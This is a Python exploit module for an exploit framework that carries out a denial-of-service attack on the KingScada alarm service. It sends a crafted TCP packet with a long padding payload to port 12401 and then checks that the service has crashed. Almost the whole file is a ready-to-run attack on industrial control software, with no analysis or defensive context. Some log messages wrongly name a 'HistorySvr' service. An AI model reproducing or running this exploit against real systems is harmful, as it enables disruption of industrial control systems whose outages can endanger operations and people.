#!/usr/bin/env python

import socket
import time
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_kingscada_aeserver_dos.py"
INFO['DESCRIPTION'] = "KingScada Alarm Service DoS"
INFO['VENDOR'] = "http://www.wellintech.com/index.php?option=com_content&view=article&id=64&Itemid=79"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    Specially crafted TCP packets sent to 12401 port cause DoS.
Tested against KingScada 3.1 on Windows 7 x64 sp1.
"""
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG']="15 Sep, 2017. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()

OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 12401


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO["NAME"]

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def make_url(self, path=''):
        return 'http://%s:%s/%s' % (self.host, self.port, path)

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Trying to connect to %s:%s' % (self.host, self.port))
        s=socket.socket()
        addr = (self.host, self.port)
        try:
            s.connect(addr)
            s.close()
        except:
            self.log('[-] HistorySvr is unavailable')
            self.finish(False)
        self.log('[*] Trying to DoS')
        s = socket.socket()
        s.connect(addr)
        data = "\xd2\x04\x00\x00\x7b\x00\x00\x00\xff\x11\x00\x00\x00\x00\x00\x00" \
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x49\x00\x6b\x00" \
               "\x78\x00\x41\x00\x6c\x00\x61\x00\x72\x00\x6d\x00\x53\x00\x65\x00" \
               "\x72\x00\x76\x00\x65\x00\x72\x00\x43\x00\x61\x00\x6c\x00\x6c\x00" \
               "\x42\x00\x61\x00\x63\x00\x6b\x00\x5f\x00\x54\x00\x45\x00\x53\x00" \
               "\x54\x00\x2d\x00\x64\x00\x31\x00\x64\x00\x64\x00\x32\x00\x32\x00" \
               "\x39\x00\x63\x00\x2d\x00\x31\x00\x35\x00\x31\x00\x61\x00\x2d\x00" \
               "\x34\x00\x33\x00\x37\x00\x31\x00\x2d\x00\x39\x00\x35\x00\x38\x00" \
               "\x63\x00\x2d\x00\x64\x00\x34\x00\x63\x00\x39\x00\x31\x00\x36\x00" \
               "\x66\x00\x35\x00\x31\x00\x64\x00\x63\x00\x65\x00\x20\x00\x3a\x00" \
               "\x20\x00\x74\x00\x63\x00\x70\x00\x20\x00\x2d\x00\x68\x00\x20\x00" \
               "\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00" \
               "\x31\x00\x2e\x00\x31\x00\x37\x00\x36\x00\x20\x00\x2d\x00\x70\x00" \
               "\x20\x00\x31\x00\x38\x00\x30\x00\x30\x00\x30\x00\x20\x00\x2d\x00" \
               "\x74\x00\x20\x00\x30\x00" + 'A' * 66000
        s.sendall(data)
        s.recv(1024)
        self.log('[*] Checking service state')
        time.sleep(10)
        try:
            s = socket.socket()
            s.connect(addr)
        except:
            self.log('[+] Alarm service is unavailable now')
            self.finish(True)
        self.log('[-] HistorySvr is still available')
        self.finish(False)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
